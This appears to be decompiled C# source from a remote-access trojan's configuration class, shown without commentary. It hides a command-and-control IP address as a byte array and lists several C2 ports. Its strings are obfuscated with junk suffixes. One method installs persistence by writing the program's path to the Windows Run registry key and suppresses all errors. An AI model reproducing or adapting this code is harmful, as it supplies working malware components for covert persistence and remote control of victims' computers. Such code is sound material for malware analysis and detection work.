using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace trbgertrnion;

internal static class CIADINF
{
	public static byte[] trbgertrnionvpsips = new byte[14]
	{
		49, 54, 55, 46, 49, 54, 48, 46, 49, 54,
		54, 46, 56, 48
	};

	public static string filePath = Application.get_ExecutablePath();

	public static string trbgertrniondefaultP = "10.200.121.121|trbgertrnion".Split(new char[1] { '|' })[0];

	public static string trbgertrnionmainApp = Path.GetFileNameWithoutExtension(Application.get_ExecutablePath());

	public static int[] ports = new int[5] { 12214, 8868, 6288, 18822, 16441 };

	public static int trbgertrnionport;

	public static string trbgertrnionpc_id = "vttbae|trbgertrnion".Split(new char[1] { '|' })[0];

	public static string trbgertrnionremvUser = "ldtdharinc|trbgertrnion".Split(new char[1] { '|' })[0];

	public static string trbgertrnionfilesLogs = "hitfhbrvs".Split(new char[1] { '|' })[0];

	public static byte[] getByteArray(string value)
	{
		MemoryStream memoryStream = new MemoryStream();
		TextWriter textWriter = new StreamWriter(memoryStream);
		textWriter.Write(value);
		textWriter.Flush();
		memoryStream.Flush();
		return memoryStream.ToArray();
	}

	public static string getBytsString(byte[] data)
	{
		char[] array = new char[data.Length];
		for (int i = 0; i < data.Length; i++)
		{
			char c = (array[i] = Convert.ToChar(data[i]));
		}
		return new string(array);
	}

	public static string trbgertrnionget_mpath()
	{
		return Path.GetDirectoryName(filePath) + "\\";
	}

	public static void trbgertrnionset_run(string app, string path)
	{
		try
		{
			string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|trbgertrnion".Split(new char[1] { '|' })[0];
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
			object value = registryKey.GetValue(trbgertrnionpc_id + app);
			if (value == null || value.ToString() != path)
			{
				registryKey.SetValue(trbgertrnionpc_id + app, path);
			}
		}
		catch
		{
		}
	}

	public static string trbgertrnionOsname()
	{
		try
		{
			OperatingSystem oSVersion = Environment.OSVersion;
			return oSVersion.Version.Major + ">" + oSVersion.Version.Minor;
		}
		catch
		{
			return "6>1!trbgertrnion".Split(new char[1] { '!' })[0];
		}
	}
}
